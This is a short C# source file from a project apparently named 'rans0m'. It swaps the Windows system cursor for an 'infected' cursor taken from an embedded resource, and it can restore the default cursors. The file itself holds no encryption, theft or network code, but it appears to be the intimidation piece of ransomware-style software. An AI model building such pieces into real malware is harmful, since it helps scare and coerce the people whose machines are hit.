using System.IO;
using System.Runtime.InteropServices;

namespace rans0m
{
    internal static class CursorUpdater
    {
        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool SetSystemCursor(IntPtr hcur, uint id);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern IntPtr LoadCursorFromFile(string lpFileName);

        [DllImport("user32.dll")]
        private static extern bool SystemParametersInfo(uint uiAction, uint uiParam, IntPtr pvParam, uint fWinIni);

        private const uint SPI_SETCURSORS = 0x0057;
        private const uint OCR_NORMAL = 32512;

        public static void SetInfectedCursor()
        {
            try
            {
                string tempPath = Path.Combine(Path.GetTempPath(), "rans0m_infected.cur");
                File.WriteAllBytes(tempPath, Global.GetBytesFromResource("infectedcursor.cur"));

                IntPtr cursorHandle = LoadCursorFromFile(tempPath);
                if (cursorHandle == IntPtr.Zero) return;

                SetSystemCursor(cursorHandle, OCR_NORMAL);
            }
            catch { }
        }

        public static void RestoreCursor()
        {
            try { SystemParametersInfo(SPI_SETCURSORS, 0, IntPtr.Zero, 0); }
            catch { }
        }
    }
}
